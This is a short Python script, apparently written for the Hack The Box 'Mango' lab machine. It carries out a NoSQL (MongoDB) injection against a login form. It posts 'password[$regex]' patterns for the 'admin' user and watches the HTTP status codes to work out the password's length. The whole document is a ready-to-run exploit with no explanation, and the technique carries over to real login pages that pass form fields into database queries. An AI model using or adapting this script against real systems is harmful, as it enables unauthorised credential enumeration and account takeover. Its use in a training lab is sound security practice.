#!/usr/bin/env python

import requests

params = {}
params["username"] = 'admin'
params["login"] = 'login'

headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": "http://staging-order.mango.htb/",
        "Content-Type": "application/x-www-form-urlencoded"
}
enum_val = 0
while True:
    params["password[$regex]"] = '.{%s}' % enum_val 
    response = requests.post('http://staging-order.mango.htb', data=params , allow_redirects=False)
    print 'Password Length: {} Status Code: {}'.format(enum_val, response.status_code)
    if response.status_code != 302:
        break
    enum_val = enum_val + 1
